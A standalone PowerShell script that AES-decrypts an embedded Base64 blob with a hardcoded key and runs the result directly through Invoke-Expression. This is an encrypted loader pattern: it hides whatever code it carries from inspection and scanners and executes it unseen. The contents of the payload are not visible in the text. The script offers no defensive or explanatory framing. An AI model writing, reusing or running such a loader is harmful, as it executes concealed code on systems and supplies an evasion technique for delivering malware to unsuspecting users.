function AES-Decrypt {
    param (
        [string]$key,
        [string]$encryptedBase64
    )

    # Convert Base64 string to byte array
    $encryptedBytes = [Convert]::FromBase64String($encryptedBase64)

    # Convert key to byte array
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

    # Create AES provider
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Key = $keyBytes

    # Assume Initialization Vector is the first 16 bytes of the encrypted data
    $iv = $encryptedBytes[0..15]
    $aes.IV = $iv

    # Extract the ciphertext (everything after the first 16 bytes)
    $cipherTextBytes = $encryptedBytes[16..($encryptedBytes.Length - 1)]

    # Create a decryptor
    $decryptor = $aes.CreateDecryptor()

    # Decrypt the ciphertext
    $decryptedBytes = $decryptor.TransformFinalBlock($cipherTextBytes, 0, $cipherTextBytes.Length)

    # Convert the decrypted byte array to a string
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

# Encrypted Base64 string
$encryptedBase64 = "spsRpHraFuNBld2beFxxx/yGrFtr2qANpO6ErU1OO1wp4L2G/F6b7q1uq2tE6T7adA7BoNVXOfBPcP70S8CGmIsNNeYZ73J8y2LkQu6NKFbf75wzuz2h5VqId0/SSnwQyVxNuUUt+ELu7YtHRSMm6VFBu7uxVF+1YDHo1yZ70cMBtTy2FRT5ikELWPCKlprJTNItoBqzM8Eoy6pGJnCKQ1Qo0HEwnu5Vh6TlFa+Xvc0MgT8y6Peycli1/PDBzVSZzVktQXA6SJLgX+1SONc6gHQEPUFg8gY4vSCV9pPz4T9nKUTBQA0cEPvRBO/0fjuNWEZ0nCOD3UA4d5AFMmT9lg=="

# Decrypt with symetrical key
$key = "supersecretkey123456789012345678" # Must be 32 characters (256-bit key)
$decryptedMessage = AES-Decrypt -key $key -encryptedBase64 $encryptedBase64

# Execute the decrypted message
Invoke-Expression $decryptedMessage
